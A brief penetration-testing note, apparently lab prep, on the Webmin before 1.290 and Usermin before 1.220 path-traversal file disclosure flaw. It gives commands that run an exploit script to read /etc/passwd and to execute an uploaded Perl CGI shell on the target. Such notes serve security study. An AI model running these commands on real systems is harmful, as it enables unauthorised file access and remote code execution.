# Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl) 

## Current Description

Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML, which allows remote attackers to read arbitrary files, as demonstrated using "..%01" sequences, which bypass the removal of "../" sequences before bytes such as "%01" are removed from the filename. NOTE: This is a different issue than CVE-2006-3274.

## Read file

```sh
./file_disclosure.pl 10.11.1.xxx 10000 /etc/passwd 0
```

## As webmin executes cgi script you can create a perl payload and execute it as cgi

```sh
./file_disclosure.pl 10.11.1.xxx 10000 /home/username/shell.cgi 0
```
